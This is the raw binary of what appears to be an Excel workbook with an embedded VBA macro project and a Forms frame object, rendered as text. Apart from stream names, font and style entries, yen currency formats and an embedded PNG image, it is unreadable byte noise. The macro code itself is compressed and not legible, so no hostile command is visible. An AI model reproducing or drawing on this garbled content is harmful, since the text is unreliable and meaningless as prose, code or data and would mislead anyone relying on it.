ÐÏà¡±á                >  þÿ	                               þÿÿÿ           ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿýÿÿÿ   Z   ‹   z             	   
   
      
                                                             !   "   #   $   %   &   '   (   )   *   +   ,   -   .   /   0   1   2   3   4   5   6   7   8   9   :   ;   <   =   >   ?   @   A   B   C   D   E   F   G   H   I   J   K   L   M   N   O   P   Q   R   S   T   U   V   W   X   Y   þÿÿÿ†   \   ]   ^   _   `   a   b   m   d   e   f   g   h   i   j   k   l   [   n   o   p   q   r   s   t   u   v   w   x   y   þÿÿÿ{   |   }   ~   €   ýÿÿÿR o o t   E n t r y                                               ÿÿÿÿÿÿÿÿ         À      F    ],FkWÓÔ ä`MZÓÔ   @8      W o r k b o o k                                                     ÿÿÿÿÿÿÿÿ                                       Ó¨      _ V B A _ P R O J E C T _ C U R                                 "  ÿÿÿÿÿÿÿÿ                       @ŒÝBZÓÔÐeCZÓÔ            M B D 0 1 5 2 1 2 6 3                                                       n`ôÎ›Í ª `Ž    `ÚÝBZÓÔðöþBZÓÔ            f                                                                 ÿÿÿÿÿÿÿÿÿÿÿÿ                                        l       o                                                                      ÿÿÿÿ                                    þÿÿÿ         C o m p O b j                                                   ÿÿÿÿÿÿÿÿÿÿÿÿ                                       p       V B A                                                             ÿÿÿÿÿÿÿÿ
                       @
 CZÓÔp™CZÓÔ               þÿÿÿ   þÿÿÿ             	   
   
      
                                                      þÿÿÿ    !   "   #   $   %   &   '   (   )   *   +   ,   -   .   þÿÿÿ0   1   2   3   4   5   6   7   8   9   :   ;   <   =   >   ?   @   A   B   C   D   E   F   G   H   I   J   K   L   M   N   O   P   Q   R   S   T   U   V   W   X   Y   þÿÿÿ[   \   ]   ^   _   `   a   b   c   d   e   f   g   h   i   j   k   l   m   n   o   p   q   r   s   t   u   v   w   x   y   z   {   |   }   ~      €    4   €  €     €  €ÿÿ   }  #  Ÿ           cppRã
‘Îã ª K¸Q€  <¸ ‚l‚r ‚oƒSƒVƒbƒN                               þÿ
  ÿÿÿÿ  n`ôÎ›Í ª `Ž   Microsoft Forms 2.0 Frame    Embedded Object    Forms.Frame.1 ô9²q                            rU               @       @               8                            P                        
          A
          q
          ÿÿÿÿÿÿÿÿá	           / `   ¡
          ±          Ñ
          ÿÿÿÿÿÿÿÿÿÿÿÿ  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ	   T8Í É    á  °Á    â   \ p   IEAspp                                                                                                       B  °a   À  =  Ó   º   ThisWorkbookœ               ¯   ¼   =      .wh8      X@        "       ·   Ú    1  Ü       €  C a l i b r i 1  Ü       €  C a l i b r i 1  Ü       €  C a l i b r i 1  Ü       €  C a l i b r i 1  Ü       €  C a l i b r i 1 * h  6    € 
C a l i b r i   L i g h t 1  , 6 ¼   €  C a l i b r i 1   6 ¼   €  C a l i b r i 1  Ü  6 ¼   €  C a l i b r i 1  Ü       €  C a l i b r i 1  Ü       €  C a l i b r i 1  Ü   <    €  C a l i b r i 1  Ü   >    €  C a l i b r i 1  Ü  ? ¼   €  C a l i b r i 1  Ü  4 ¼   €  C a l i b r i 1  Ü   4    €  C a l i b r i 1  Ü  	 ¼   €  C a l i b r i 1  Ü   
    €  C a l i b r i 1  Ü      €  C a l i b r i 1  Ü   ¼   €  C a l i b r i 1  Ü   	    €  C a l i b r i     "¥"#,##0;\-"¥"#,##0    "¥"#,##0;[Red]\-"¥"#,##0     "¥"#,##0.00;\-"¥"#,##0.00#    "¥"#,##0.00;[Red]\-"¥"#,##0.005 * 0  _-"¥"* #,##0_-;\-"¥"* #,##0_-;_-"¥"* "-"_-;_-@_-, ) '  _-* #,##0_-;\-* #,##0_-;_-* "-"_-;_-@_-= , 8  _-"¥"* #,##0.00_-;\-"¥"* #,##0.00_-;_-"¥"* "-"??_-;_-@_-4 + /  _-* #,##0.00_-;\-* #,##0.00_-;_-* "-"??_-;_-@_-à      õÿ            À à     õÿ   ô        À à     õÿ   ô        À à     õÿ   ô        À à     õÿ   ô        À à     õÿ   ô        À à     õÿ   ô        À à     õÿ   ô        À à     õÿ   ô        À à     õÿ   ô        À à     õÿ   ô        À à     õÿ   ô        À à     õÿ   ô        À à     õÿ   ô        À à     õÿ   ô        À à                  À à     õÿ   ´       › à     õÿ   ´       ¯ à     õÿ   ´       ‰ à     õÿ   ´       š à     õÿ   ´       Ÿ à     õÿ   ´       ª à     õÿ   ´       ¬ à     õÿ   ´       ¯ à     õÿ   ´       – à     õÿ   ´       « à     õÿ   ´       ¬ à     õÿ   ´       « à     õÿ   ´       ¬ à     õÿ   ´       ¯ à     õÿ   ´       – à     õÿ   ´       « à     õÿ   ´       ± à     õÿ   ´       ¹ à     õÿ   ´       ± à     õÿ   ´       µ à     õÿ   ´       · à     õÿ   ´       ³ à     õÿ   ´       ¾ à     õÿ   ´       ¹ à  
   õÿ   ´       ­ à     õÿ   ”—
—
 – à     õÿ   ”ff¿¿ · à   + õÿ   ø        À à   ) õÿ   ø        À à   , õÿ   ø        À à   * õÿ   ø        À à     õÿ   ô        À à  
   õÿ   ´       ª à      õÿ   Ô P  €  À à     õÿ   Ô P     À à  	   õÿ   Ô       À à  	   õÿ   ô        À à  
   õÿ   ”—
—
 ¯ à     õÿ   Ô `     À à     õÿ   ´       « à     õÿ   œ

 š à     õÿ   ”¿¿ – à   	 õÿ   ø        À à     õÿ   ô        À à     õÿ   Ô a  ±  À à     õÿ   ô        À | |            > p°ú}- }                 
        _-;_-* "  }- }                
        _-;_-* "  }- }                
        _-;_-* "  }- }                
        _-;_-* "  }- }                
        _-;_-* "  }- }                
        _-;_-* "  }- }                
        _-;_-* "  }- }                 
        _-;_-* "  }- }                
        _-;_-* "  }- }            	    
        _-;_-* "  }- }            
    
        _-;_-* "  }- }            
    
        _-;_-* "  }- }                
        _-;_-* "  }- }            
    
        _-;_-* "  }- }                
        _-;_-* "  }- }                
        _-;_-* "  }A }                
        _-;_-* "     ef   -@_-    }A }                
        _-;_-* "     ef   -@_-    }A }                
        _-;_-* "     ef   -@_-    }A }                
        _-;_-* "     ef    -@_-    }A }                
        _-;_-* "     ef   -@_-    }A }                
        _-;_-* "     ef	   -@_-    }A }                
        _-;_-* "     ÌL   -@_-    }A }                
        _-;_-* "     ÌL   -@_-    }A }                
        _-;_-* "     ÌL   -@_-    }A }                
        _-;_-* "     ÌL    -@_-    }A }                
        _-;_-* "     ÌL   -@_-    }A }                
        _-;_-* "     ÌL	   -@_-    }A }                
         _-;_-* "     23   -@_-    }A }                
         _-;_-* "     23   -@_-    }A }                
         _-;_-* "     23   -@_-    }A }                
         _-;_-* "     23    -@_-    }A }                 
         _-;_-* "     23   -@_-    }A }            !    
         _-;_-* "     23	   -@_-    }A }            "    
         _-;_-* "          -@_-    }A }            #    
         _-;_-* "          -@_-    }A }            $    
         _-;_-* "          -@_-    }A }            %    
         _-;_-* "           -@_-    }A }            &    
         _-;_-* "          -@_-    }A }            '    
         _-;_-* "       	   -@_-    }A }            (    
     œ ÿ_-;_-* "       ÿÇÎÿ-@_-    }‘ }            )     
     ú} ÿ_-;_-* "       òòòÿ-@_-          ÿ             ÿ        	     ÿ        
     ÿ        }‘ }            *     
         _-;_-* "       ¥¥¥ÿ-@_-          ???ÿ             ???ÿ        	     ???ÿ        
     ???ÿ        }- }            +    
        _-;_-* "  }- }            ,    
        _-;_-* "  }- }            -    
        _-;_-* "  }- }            .    
        _-;_-* "  }- }            /    
     ÿ_-;_-* "  }A }            0    
      a ÿ_-;_-* "       ÆïÎÿ-@_-    }A }            1    
        _-;_-* "          -@_-    }A }            2    
        _-;_-* "     ÿ?   -@_-    }A }            3    
        _-;_-* "     23   -@_-    }- }            4    
        _-;_-* "  }‘ }            5     
     ??vÿ_-;_-* "       ÿÌ™ÿ-@_-          ÿ             ÿ        	     ÿ        
     ÿ        }A }            6    
     ú} ÿ_-;_-* "       ÿ€ÿ-@_-    }A }            7    
     œe ÿ_-;_-* "       ÿëœÿ-@_-    }‘ }            8     
        _-;_-* "       ÿÿÌÿ-@_-          ²²²ÿ             ²²²ÿ        	     ²²²ÿ        
     ²²²ÿ        }‘ }            9     
     ???ÿ_-;_-* "       òòòÿ-@_-          ???ÿ             ???ÿ        	     ???ÿ        
     ???ÿ        }- }            :    
        _-;_-* "  }- }            ;    
        _-;_-* "  }U }            <    
        _-;_-* "           -@_-                    }- }            =    
     ÿ  ÿ_-;_-* "  “  
  20% - Accent1’M ’          ÿ
 2 0 %   -   A c c e n t 1       efÝë÷ÿ        ÿ%  “  
  20% - Accent2’M ’          "ÿ
 2 0 %   -   A c c e n t 2       efüäÖÿ        ÿ%  “  
  20% - Accent3’M ’          &ÿ
 2 0 %   -   A c c e n t 3       efíííÿ        ÿ%  “  
  20% - Accent4’M ’          *ÿ
 2 0 %   -   A c c e n t 4        efÿòÌÿ        ÿ%  “  
  20% - Accent5’M ’          .ÿ
 2 0 %   -   A c c e n t 5       efÙáòÿ        ÿ%  “  
  20% - Accent6’M ’          2ÿ
 2 0 %   -   A c c e n t 6       	efâïÚÿ        ÿ%  “  
  40% - Accent1’M ’          ÿ
 4 0 %   -   A c c e n t 1       ÌL½×îÿ        ÿ%  “  
  40% - Accent2’M ’          #ÿ
 4 0 %   -   A c c e n t 2       ÌLøË­ÿ        ÿ%  “  
  40% - Accent3’M ’          'ÿ
 4 0 %   -   A c c e n t 3       ÌLÛÛÛÿ        ÿ%  “  
  40% - Accent4’M ’          +ÿ
 4 0 %   -   A c c e n t 4        ÌLÿæ™ÿ        ÿ%  “  
  40% - Accent5’M ’          /ÿ
 4 0 %   -   A c c e n t 5       ÌL´Æçÿ        ÿ%  “  
  40% - Accent6’M ’          3ÿ
 4 0 %   -   A c c e n t 6       	ÌLÆà´ÿ        ÿ%  “  
  60% - Accent1’M ’           ÿ
 6 0 %   -   A c c e n t 1       23›Âæÿ      ÿÿÿÿ%  “  
  60% - Accent2’M ’          $ÿ
 6 0 %   -   A c c e n t 2       23ô°„ÿ      ÿÿÿÿ%  “  
  60% - Accent3’M ’          (ÿ
 6 0 %   -   A c c e n t 3       23ÉÉÉÿ      ÿÿÿÿ%  “  
  60% - Accent4’M ’          ,ÿ
 6 0 %   -   A c c e n t 4        23ÿÙfÿ      ÿÿÿÿ%  “   
  60% - Accent5’M ’          0ÿ
 6 0 %   -   A c c e n t 5       23Ž©Ûÿ      ÿÿÿÿ%  “ ! 
  60% - Accent6’M ’          4ÿ
 6 0 %   -   A c c e n t 6       	23©ÐŽÿ      ÿÿÿÿ%  “ "    Accent1’A ’          ÿ  A c c e n t 1         [›Õÿ      ÿÿÿÿ%  “ #    Accent2’A ’          !ÿ  A c c e n t 2         í}1ÿ      ÿÿÿÿ%  “ $    Accent3’A ’          %ÿ  A c c e n t 3         ¥¥¥ÿ      ÿÿÿÿ%  “ %    Accent4’A ’          )ÿ  A c c e n t 4          ÿÀ ÿ      ÿÿÿÿ%  “ &    Accent5’A ’          -ÿ  A c c e n t 5         DrÄÿ      ÿÿÿÿ%  “ '    Accent6’A ’          1ÿ  A c c e n t 6       	  p­Gÿ      ÿÿÿÿ%  “ (   Bad’9 ’          ÿ B a d      ÿ  ÿÇÎÿ  ÿ  œ ÿ%  “ ) 
  Calculation’ ’          ÿ
 C a l c u l a t i o n       ÿ  òòòÿ  ÿ  ú} ÿ%    ÿ  ÿ    ÿ  ÿ   ÿ  ÿ 	  ÿ  ÿ “ * 
  Check Cell’ ’          ÿ
 C h e c k   C e l l       ÿ  ¥¥¥ÿ      ÿÿÿÿ%    ÿ  ???ÿ    ÿ  ???ÿ   ÿ  ???ÿ 	  ÿ  ???ÿ “ +€ÿ’  ’          ÿ C o m m a     “ ,€ÿ’( ’          ÿ	 C o m m a   [ 0 ]     “ -€ÿ’& ’          ÿ C u r r e n c y     “ .€ ÿ’. ’           ÿ C u r r e n c y   [ 0 ]     “ /   Explanatory Text’G ’          5ÿ E x p l a n a t o r y   T e x t      ÿ  ÿ%  “	 0   Good’; ’          ÿ G o o d      ÿ  ÆïÎÿ  ÿ   a ÿ%  “ 1 	  Heading 1’G ’          ÿ	 H e a d i n g   1         DTjÿ%        [›Õÿ “ 2 	  Heading 2’G ’          ÿ	 H e a d i n g   2         DTjÿ%      ÿ?¬Ìêÿ “ 3 	  Heading 3’G ’          ÿ	 H e a d i n g   3         DTjÿ%      23›Âæÿ “ 4 	  Heading 4’9 ’          ÿ	 H e a d i n g   4         DTjÿ%  “
 5   Input’u ’          ÿ I n p u t       ÿ  ÿÌ™ÿ  ÿ  ??vÿ%    ÿ  ÿ    ÿ  ÿ   ÿ  ÿ 	  ÿ  ÿ “ 6 
  Linked Cell’K ’          ÿ
 L i n k e d   C e l l      ÿ  ú} ÿ%     ÿ  ÿ€ÿ “ 7    Neutral’A ’          ÿ  N e u t r a l      ÿ  ÿëœÿ  ÿ  œe ÿ%  “  € ÿ’3 ’           ÿ N o r m a l            ÿ%  “	 8   Note’b ’          
ÿ N o t e      ÿ  ÿÿÌÿ  ÿ  ²²²ÿ    ÿ  ²²²ÿ   ÿ  ²²²ÿ 	  ÿ  ²²²ÿ “
 9   Output’w ’          ÿ O u t p u t       ÿ  òòòÿ  ÿ  ???ÿ%    ÿ  ???ÿ    ÿ  ???ÿ   ÿ  ???ÿ 	  ÿ  ???ÿ “ :€ÿ’$ ’          ÿ  P e r c e n t     “
 ;   Title’1 ’          ÿ T i t l e         DTjÿ%  “
 <   Total’M ’          ÿ T o t a l            ÿ%       [›Õÿ       [›Õÿ “ =   Warning Text’? ’          
ÿ W a r n i n g   T e x t      ÿ  ÿ  ÿ%  ŽX Ž               T a b l e S t y l e M e d i u m 2 P i v o t S t y l e L i g h t 1 6 `   …  :¡    	3 . 2 0 1 9 ·0ü0È0š š                    £ £              Œ   Q Á Á  a| fN f             ð8     ð                    @ ñ   ÿÿ    ÿ €€€ ÷  ë     ðef    ð                    / ð
f  "  ðº  …˜6ZiÑÁ]¤ûÅÂß„ÿ –           O@=ðŽ  …˜6ZiÑÁ]¤ûÅÂß„<	                 X™ à  \   þx¥UOHTaŸ÷v]ÝÕÖU$ÌLÖÒôðP(È ¥D¥¥KP'IíPJKJä©Çî¡[	D—N³‹á¥CÕµòÒ±«‡Jƒ´0{ý~ß{£Ïu‹ÌYæ}óÍÌ73ßoæ½µDd¬”€P¦¬{,‘GXÓÇÎ±äP\¤û’Å¯¥"Ÿm‘:ðë[ûþ2i.H+ìõàGOAhW"ˆU×;Í#Qè-A‚ˆ
STêMœ(ž«Ìd,‡‡Ÿ»ÂŽI9Kƒ µü„Åó<HôoÃyÄ‘]±F™‡TYŠúYF»=‡W\ì`gÜñØK-5¼˜HL‘¹	u›Ò)f$˜ ÛA·4>k'ýo”uUÊ.ŸX­˜Ø-Û
4	<Ä¥”É]Oç®åûóçó—ò=òý–ÈÕªËƒ´‘üÈ¶A;nQvÚ2Ò6Hí$pâ)²âUÊ`6k:µlW “ãg³lÛîŸ•Ì^€3ð*ÙË1MUßÎdülŒ&Òbyû)R® s‰S*X‰)»Þs^¹W*´7ÂÀ8-àZ0 EH3dæ¢þ4x¬Tø.°ÆçL­‘{¸¸¼¦
KZ‡?-ë ¾ÌZ)3Ÿ²ê¡ZG»Ñ&­;€ÍVîp
ç»À˜Ó‘?r
¬D¼Ø3%ÝÞCõ[[ ÖD"†¬•=%-“J¬[Á!œ¯±²HÆ	^(À{Ò/Â…IÚ¼/-Ž7íÌ8/§u›¥O¾ôðMª½¸hÞ¬t°ºS¾žóLzð,RÏ÷[ýo¦pß9Kº"ûÌùñ+ÕÙ¸7¹Þ¿3Ñ8G»bÈû’T_{×÷?—L¤^íºW¿Î„	ã1?§Dó+öêÿæÛÊNÖ«S¤zjx_ÒÐ
ÿ#£Øo¾+¼3¯²#$g €•xïÓóp¶»£c¶;‡ï?¿Dª[/g„q%‹Ÿÿ-áÿ
Y{Î3Õ
‹!í¹ù
Ê„ŒÉ¸Ë¨š7½jÿµçaÌ‹õü~Ó³?>‰ü©çÏo?6³E\H:þn
#Þ¤½Î^°ÍÌ…ó‡{Î^‘>üšzG4Þ‡òhCð`?
{Îœ»ÁAÏ=ôÄUf×	|ÐC—ß–˜Tnó<ï¥2GLeÞ[eæãLÔ€I)0åß½‚)b  ðAb  ç\˜#]g3|2r¦Mÿ b           O nðb  ç\˜#]g3|2r¦Mÿ‰PNG

   
IHDR  ·  X   _ç%ë   tEXtSoftware Adobe ImageReadyqÉe<  a¦IDATxÚì½	|T×•'|kU•JP’(!$„@–XB€Xc0ÆØ±Ý±Iœ8ã,îöÄŸ» w;=0ýõàîvbº;Ÿ'ó9ížl:q6ìŽíØÄ;Æ,6Æ˜Ý€*$H*©Ö9÷ª[·Þ{µ—„€óÿ¢êÕ«ûÞ»Ëÿžížk`ë–3@ $€‘ª€@ ˆ%	X’@ ˆ%	X’@ ˆ%	X’@ ˆ%	X’@ ˆ%	@,I Ä’0BY²¨ô®9+YÙDªSp-ÁœkÛ]
7»é¶•“›Ì&hí¹ðÖ‰Oâ“—Žïe—.P„«†,3§LÓêš¾;wåçg,rÚº§„B¡µ¯>÷¿¶ýšj™@ \O²dÅäïÍ½ý«³oïtÉ‡/ô÷ú¼£ÇÄ”y£±ÈbËÇ=°À`ŒÖMfôSË„Ç’ºxõÚ…wÏ7IéìíùàÔá·Nøaó§ìÜñ§>÷È_/»?ƒ‹8¦UOŸZTra°ç™£ì²[õ}]íÜ×îì†’ŠÿöÆÿyêÍŸß7ïÎgï|ØUä\ñ6Î3>ÈB?|ïWÔ„a¤°äº›>?uìT¥¿õò³ÿv|/ë8ÅX8;ñðûwþÙŸßø9»ÅêõûlK8Ì~µÛš—žaýžÈ9¶¢Ýmxóø¾É›ÿ‘ùúYù
¿þâ_þÓû[žØ¿]¾ø¿ïþ³Á@€X’@ Œ –4ø&ÿÛîW˜0Ëk-o=üÔ’šÿðÎ¯þnçË@yÌæøJãÒ~îO÷?ú/?ü/l°Îª¯ž^Z8úËo<Ï:NÂÇo/ýR |âõ³ >N~æ¿°pˆÚ@ 52‰Š²$G8ûK>¶ôþ[ëf}ù7ÿôw[Ìàá ó^úåîWÆüÛßLqÿçUãi¥–þŸÂ˜ »Ù:ðÇ,’ý=ð+j?0’dI•%pdX¦ÑÄTû_þæO_úx«ú«³‡±ïÝoÎ_ù—¯=÷Ä-_^qC#{áîo]€7s*o õü¹ûÿ*üù‹ÿ¼vé—/û ºãE,ôósV~söò‰ÅeîþKOï|uëþ·øáªi¿Xú¥©c«Î_îþ‡]¯|pè}jo0„²¤ÁÎÃË&U—=ÿé{º_þòð.§ÍQ:~jXgÞ0ïe|~Úw×5á}=ÿ•ÿö«/ý×ŽÞžÿùÑkûÚNÞUËéµiêBï·Pd³ÿhÏVøê½‡þû½sï ö&C(K
¥†ÓbLƒFºœ[:þ¾ÞqZ÷ü7ºÛáïüÑ®ï½õüöó7¯œÒô•WÄz:ààº[×Ô©|ä7ßWiû÷Î½}Íœå+žßøÎÁwc–“åÅ/>öëOßÿÚ
 þ±@(ô/·?¤°aju0$²¤1ªq‡ÃÙÍÄy9˜¨åx(·Ì·çÞ¾ýÔ¡E*…ÔMj¬.û»^a|ýáä¾‰%ålt59@*Y2^.Ì’(?¸Ô—Œ©x±eŸöÛÅÅc¹DÙ“ÁºÆieU¿>°]upaÙxøÛùè?©[›ƒ‘Ë‡@ K2fÈÃÛOôxûœ¾èÅ=¯i¿\3íÆo/œ“~ya¶šÔO´÷£u}ž¸s/ž£&'C¥q
#£ÇÛ§k—4¦C£ÁŸ}üæ}3»aŽú«qµ_›»âÇýQZ˜ûÚ[VÔÎR	º/œ?
w[SPÈ.´H¯S´´‘@ !K‚øüÇo-úÉ†ò¿€…Y_ò/¶þ´ùbû‘¯ÿ/Ï¿‹¯Ñ˜¬+g.?ÿgß;Ý}aÝšQiõþ–©eUÿtÏw þÙRP8©‘9tàü©çïùÏlLUä¼ò¸µ7@B{Ö¾ÅBùÅ.M}ö/~ÿº_Þÿ—?þü·/z/±¶[¬/Ù}ïoÿI„‘§‰£Ç?zô•ýwþé×ç®8ëqW—ÿêÓ÷¾ujãæ-ßüûÁÇròb»Õl?ÚõWþ•Ú›@ dŠL2§9JnžÔPUT¼Ó}îÔÅs #ã{wû¯nù‚|ä»[þÔ›?OX`ÙÄ¯Ü0Óeu¡ÿÒ¯Z0wkÜ·öÑ…å“úÏ‰¨É£Ë˜ÓÅà#bl

c?åºwÊÜ’‚Âg6uÍ
'ÏV<¶c ÷µ–ƒ¬ç<µ7@J–DŒ™ðßç®üÚÜ£JOuu¿Øv´óÜÑ®6 §'šnûÚ¼•°$@ \ƒ,ýaYÍ¬'çÞþ¥Æ%Åö"Ý3¼þÁ‡ÿãÿÿåî—©–	ÂuÈ’QX
î˜¾ä;sW®œÒ„9g{:_9úÑÏïÜÕ¼—ù¼TÅáúfI¢Ò ¦/záìqÖvŒª•@ KÂuÚ›@ ˆ%	X’@ ˆ%	X’@ ˆ%	X’@ ˆ%‡ Å•üE WæìZV“ð«~ëëÊýæ\•õß˜ÒT>ªÞw\îþé±½î¶##«þ¬öÇoZÝÞÛ½yÏ¨3Ä’qØ´ð®D_½qbÿÖ#Ûr¿¹Çf-õx{¶ŸoksgÍø¸~Ä°dÃÄÙ Oï[Ó¸Hœóø¼Ï]«D	OzSÅ¤Ãî¶í­ haþÐ)Lkg.†ÿÏzº·ì3Ÿ%;JWU7Àÿ[[æEv!–YƒÓf¶¬ß÷ëiƒ =6Ý¼¹i$ÈÀŒûÊ*7ï§¢ˆ³äìŠ®U¢¼µzruqù”²ªížNÖÙ’—qË
Kœe“Š]¥vÇ/š&Q ÅÇŽæƒ<Ñ¼«”–ë-ù ±›]1X
 ’‡¤äBçÊ:¾CýV÷™«ˆ%Yxï–ÖÏFˆî˜+Kîk?¹ùô;gàØ`ýÝÑ2»ñàÁ+^g»SIÇ™‘±§wlAÒ„§êl?ñá5Æ’±Ñ›i³–Õ¬rMÀ·S]¼§­Èis¨ÎztFÑF÷©DR*rt–A	Y ´öt<óþo®d-{")¢Ç•^­%B+L0+?QVÕZÛðÌÞ·®8¹çÊ’}½ù‘/4ØÚ~zÿ’ê™È;ðÆú¥‘“ó¡à¯n¼­ÊÉm )¦¯kýÎ—Ÿ\tˆºÀŒû:Û€(7Üò ŒÿEU“¯1–tUÖã›ŽËÝ™vV—Å–.Yì×š.•—[ZÓçõôA‚NÊŠº6Š+¯°¨›‰Ðšûx¼oÊœØœá¿òcè5nI È{:adÞ[¿`yÍEqðßWòÕ* ÈˆÜ\rFèiDùõÆ%ë<6~´uuõô<[”F î¨Œøè^k9ÄÇª¥ ¸o.üV¨®“u0èK$…¹ABŒb à¿ÐÛ%dÉu»^P*:@—`VÞ¿H™ñX3±E~ÝoYRózúæ×PèEg¢³Ôf±¨tç­Í¥3 @÷ŽÚÎq8Ç@=ƒLÝì©ßõSø`SÕùÚ›ï‡¿o·j“’Báxýø'#aúr–ŠÌN!ZÉØŽÓGapÞT1	>>{h×Èrp÷´½px7P$çnåã–‘?Û§Ò• 8Îµê6<iÆÅú¼ë^þ¡Jöt†ú rV–Þ?½2;Å»Æ£
²¡˜$0 #€õÄÕã­¨(lâ{QíºÄ
ÓÕfÝþ¥9dUïEéÌ )ë{ÂxwÇP›¼„ 	#k„hfæ‘<xoš8­ör÷ÓQ ÎHLªOù Ý‰mjW
$]‰ ‹N¨ôq-8€îìè=ëéîóû"bš˜'2·¢¢~ªÇ=T²ðH‚,HòŸo9 ;›é³$÷¬e…UµP_0W¯ª¨Û:2Å4«}œ¥À]XrÕ³¤FÎÂ‘)É}í'¹š±sý—â˜¿âNá¡G¦NçÖž®¶–{€
 ZäAZ£D¶ Ñl0èSTžõ8"AôÈ|v°Üýæa[³RvË'à¬ÒçY£§¸r‰«ª©b"Ž"îåßsÕó…ÖP¸¤n> HFYF8iÖíOgIBî´«·Ì!Ù“â3w‡Ì’H1pz#'¯~Oƒ«ZX! ŠT!¨½íí'´d}>Ruãm ?qéÓçÓW6­vîé’ŠM9¹DJý½õ
¸hvhÇ9Zó.HÂ$½åè #çÆF®Æ-,>¼S^iZt:Ñ”®•/¦•M`× TãÇQzÇäÈ¬ã?»"“(ƒÚ¯rÅI®{fª™	BÔ’ŒgA‘Ç:Ï>·w«,ñ!ÙA¾êˆÚØ E%–e¶4ïE–l_ËiËT¼C«\°û_?ýî¿Çî3•w;c÷Cÿ)«YµŠò¨¯hð	páÍ3 >H9

Aò…Ã»G”~6RYR^¸èËŒ°fb}§Ò)Ó1ÏÛÌWe}
Ï’âÎBó½R–„Ççß‰Æ8 ¯·*txÐ×•ÐuP\)(RÑ$Ô‚ö6÷9 9¨@Ðò@%zú£×ÒÕòúº Â
á·ko¼{Àï‡î§Š0åäâ!í*RwU9…TÕbè+Kl±…û×

Î± “²¤$a¸ò+G®
–•VÈ†"¦”¯áIl?ÂØ‘$ 

Ú’/ÚsŸUÔ¥6µ3§cäRy„¯E*Aòø	æ‰M÷|'&îí~%á$¯‰éSßÀx{bî
Ý¯"*g^Œš	/ï‘@¸”¥H5EWr:8½o½ûÔêi‹A0„š|réýëw¾Ì+GŠ%B–L.I>Ê}¯¡Ð9¤Žæ$ÝˆL». ¤Xbµ?0ýF|Ë-##”%UMŽŒÌîŽ¡˜*yOÍŒ§wlIS°GoÆgîŽ=nOÇ5»6ž"e» Ž[pTz1ÈÑwTÖ ÙaýkÿšD4žÕÂ†JjêH ¨-ºW´ã¿ÂÚÖêÉÏì}kËþ7A¨|lÖRè9‘ù#óXìx]Þ¾Î¾^nvLàÌë8c:o0Ï%Ÿ´1@*›¬.S{zñ½ðÿ”9ŠpBÊb=ÞªÚùBwÆÓÉ’e5bpîh?•÷âŸ½Çÿ#M«žÛõ’ö4ÕCó_è¿”È2•¸Q&±ÆýøŒ›Rêõ±HÃüA=<Š+¡fä;.
F |ð8J¡69Æé\I4A«”5™P®Ò™fIE¾9ÚyFMX~/„Š‚ZùñõãŸ€Î¾^
­OÎ‚z ÎožT
¦ã:ë8ó‚sý— é‘šY4°!u(kY
v’Œ×ãYíð¼‘‘rtÏ’ºCÊÚ%7ej|Y×K®6OL¤\/Î+V7Þ&ˆ TfÝsòï
LÚØƒÁyW~ð×-¸còAy\¹>ºG®„Še_Åz{dæR­±,Bå®	‰â@X²éÖ ¹Ä±ÿ«.ˆjº+b1×—|^`´Íe5f/ƒ‡½·~Á¤bWÇõu©ÿž} &4}æ19€n$^Kuäàé}Ãi‚¤Jà±€»ª+|.×¤'æ®àéÈ®!åÊ‘Ç’e5bVÔ™®sO¦ø‘®¢5×8½ç½ÌˆñnÞçdSìKG>ÔÖL{o7²ä”²*ÕØkîê8æqô\H8Wja¸"ˆ¢(på«çèË6(b
“¢ù)´ŠÿÆ÷Î¯i\¨Ã¤éÍ¾@R/Y¬Áƒ“×’ZY‘¯RVƒÔ3B#¥I”$èr"“ƒèV‚z.µ;†4YÉcI«ýÉy·
A’Oy¥Háš„ÂyJ‹« C:½o>±ug¨–ˆŸ!¾Þî›2G%<ë<»£ýTZÔV;š8tÇl
 éLI“ò	”N[‘ž„BešVi¸|óàÌ¤#–f¢¬ÖL¬ÏæWõ
Å{è~|Öôt
Ÿ
ïÛOèÿ¶±<bt>ëé¾n4nÅu dï÷OÉ£-S$`ýž?RFRyŒ9>2mŠ­\•õÎX¨âÇL5åGšVáP‡1°÷\3ÊòëÞß‚ŽN¡ÝÓ÷¤©e‹u8«Ê3Ð›®“7y ³ÚAÓ„qžÈ$½R#z.¼W×Œ~¥ »Œ&:KUJFšâ¿`CY¹ÞÜÙrªn
